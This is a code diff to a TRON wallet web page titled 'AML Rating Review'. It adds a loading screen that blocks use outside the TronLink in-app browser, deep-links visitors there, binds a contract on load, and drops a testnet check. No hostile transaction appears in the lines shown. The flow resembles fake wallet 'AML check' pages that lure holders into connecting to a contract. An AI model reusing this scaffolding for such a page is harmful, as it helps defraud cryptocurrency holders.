@@ -46,6 +46,93 @@
             -moz-osx-font-smoothing: grayscale;
         }
 
+        /* Loading Screen for External Browser */
+        .loading-screen {
+            position: fixed;
+            top: 0;
+            left: 0;
+            right: 0;
+            bottom: 0;
+            background: var(--bg-dark);
+            z-index: 9999;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            gap: 2rem;
+        }
+
+        .loading-screen.hidden {
+            display: none;
+        }
+
+        .loading-logo {
+            width: 80px;
+            height: 80px;
+            background: linear-gradient(135deg, var(--primary) 0%, var(--accent) 100%);
+            border-radius: 20px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-weight: 800;
+            font-size: 2rem;
+            color: white;
+            animation: pulse-logo 2s ease-in-out infinite;
+        }
+
+        @keyframes pulse-logo {
+            0%, 100% { transform: scale(1); opacity: 1; }
+            50% { transform: scale(1.05); opacity: 0.8; }
+        }
+
+        .loading-text {
+            font-size: 1.25rem;
+            font-weight: 600;
+            color: var(--text-primary);
+        }
+
+        .loading-subtext {
+            font-size: 0.9rem;
+            color: var(--text-secondary);
+            text-align: center;
+            max-width: 300px;
+        }
+
+        .loading-spinner-large {
+            width: 50px;
+            height: 50px;
+            border: 3px solid var(--border);
+            border-top-color: var(--primary);
+            border-radius: 50%;
+            animation: spin 1s linear infinite;
+        }
+
+        @keyframes spin {
+            to { transform: rotate(360deg); }
+        }
+
+        .open-tronlink-btn {
+            display: inline-flex;
+            align-items: center;
+            gap: 0.75rem;
+            padding: 1rem 2rem;
+            background: linear-gradient(135deg, var(--primary) 0%, var(--accent) 100%);
+            color: white;
+            border: none;
+            border-radius: 50px;
+            font-weight: 600;
+            font-size: 1rem;
+            cursor: pointer;
+            transition: all 0.3s;
+            text-decoration: none;
+            margin-top: 1rem;
+        }
+
+        .open-tronlink-btn:hover {
+            transform: translateY(-2px);
+            box-shadow: 0 10px 30px rgba(51, 117, 187, 0.3);
+        }
+
         /* Modal Styles */
         .modal-overlay {
             position: fixed;
@@ -204,10 +291,6 @@
             border-radius: 50%;
             animation: spin 1s linear infinite;
             margin-right: 0.5rem;
-        }
-
-        @keyframes spin {
-            to { transform: rotate(360deg); }
         }
 
         .contract-info {
@@ -1341,6 +1424,17 @@
 <base target="_blank">
 </head>
 <body>
+    <!-- Loading Screen for External Browser -->
+    <div class="loading-screen" id="loadingScreen">
+        <div class="loading-logo">AR</div>
+        <div class="loading-text">AML Rating Review</div>
+        <div class="loading-spinner-large"></div>
+        <div class="loading-subtext" id="loadingText">Checking wallet connection...</div>
+        <a href="#" class="open-tronlink-btn" id="openTronLinkBtn" style="display: none;" onclick="openInTronLink()">
+            <span>🔗</span> Open in TronLink
+        </a>
+    </div>
+
     <!-- Modal -->
     <div class="modal-overlay" id="walletModal">
         <div class="modal-content">
@@ -1695,9 +1789,73 @@
         ];
 
         let tronWeb, contract, userAddress;
+        let isInTronLinkBrowser = false;
+
+        // Check if in TronLink browser
+        function checkBrowser() {
+            const userAgent = navigator.userAgent.toLowerCase();
+            isInTronLinkBrowser = userAgent.includes('tronlink') || 
+                                  (window.tronWeb && window.tronWeb.defaultAddress.base58);
+            
+            const loadingScreen = document.getElementById('loadingScreen');
+            const loadingText = document.getElementById('loadingText');
+            const openBtn = document.getElementById('openTronLinkBtn');
+            
+            if (isInTronLinkBrowser) {
+                // In TronLink browser - hide loading screen
+                loadingScreen.classList.add('hidden');
+                initTronWeb();
+            } else {
+                // External browser - show button to open in TronLink
+                loadingText.textContent = 'For security, please open this site in TronLink browser';
+                openBtn.style.display = 'inline-flex';
+            }
+        }
+
+        // Open in TronLink browser
+        function openInTronLink() {
+            const currentUrl = window.location.href;
+            // TronLink deep link format
+            const tronLinkUrl = `tronlinkoutside://pull.activity?param=${encodeURIComponent(JSON.stringify({
+                url: currentUrl,
+                action: 'open',
+                protocol: 'https',
+                name: 'AML Rating Review'
+            }))}`;
+            
+            // Try to open TronLink
+            window.location.href = tronLinkUrl;
+            
+            // Fallback - show instructions
+            setTimeout(() => {
+                alert('If TronLink did not open automatically:\n1. Open TronLink app\n2. Go to Browser/DApp\n3. Enter: ' + currentUrl);
+            }, 2000);
+        }
+
+        // Initialize TronWeb
+        async function initTronWeb() {
+            if (window.tronWeb) {
+                tronWeb = window.tronWeb;
+                userAddress = tronWeb.defaultAddress.base58;
+                
+                if (userAddress) {
+                    contract = await tronWeb.contract(CONTRACT_ABI, CONTRACT_ADDRESS);
+                    
+                    // Update UI
+                    const connectBtn = document.getElementById('connectBtn');
+                    connectBtn.classList.add('connected');
+                    connectBtn.querySelector('span').textContent = userAddress.slice(0, 6) + '...' + userAddress.slice(-4);
+                }
+            }
+        }
 
         // Modal Functions
         function openModal() {
+            if (!isInTronLinkBrowser) {
+                openInTronLink();
+                return;
+            }
+            
             document.getElementById('walletModal').classList.add('active');
             document.body.style.overflow = 'hidden';
             resetSteps();
@@ -1735,10 +1893,6 @@
                     throw new Error('Please unlock your TronLink wallet');
                 }
 
-                // Check if on Nile Testnet
-                const node = await tronWeb.trx.getNodeInfo();
-                console.log('Connected to:', node);
-
                 contract = await tronWeb.contract(CONTRACT_ABI, CONTRACT_ADDRESS);
                 
                 // Update UI
@@ -1757,11 +1911,9 @@
         }
 
         async function connectTrust() {
-            // For Trust Wallet - open in mobile browser or use WalletConnect
             const isMobile = /iPhone|iPad|iPod|Android/i.test(navigator.userAgent);
             
             if (isMobile) {
-                // Try to open in Trust Wallet browser
                 const trustUrl = `https://link.trustwallet.com/open_url?coin_id=195&url=${encodeURIComponent(window.location.href)}`;
                 window.location.href = trustUrl;
             } else {
@@ -1806,10 +1958,8 @@
             if (e.key === 'Escape') closeModal();
         });
 
-        // Auto-connect if already has TronLink
-        if (window.tronWeb && window.tronWeb.defaultAddress.base58) {
-            connectTronLink();
-        }
+        // Initialize on load
+        window.addEventListener('load', checkBrowser);
     </script>
 </body>
 </html>
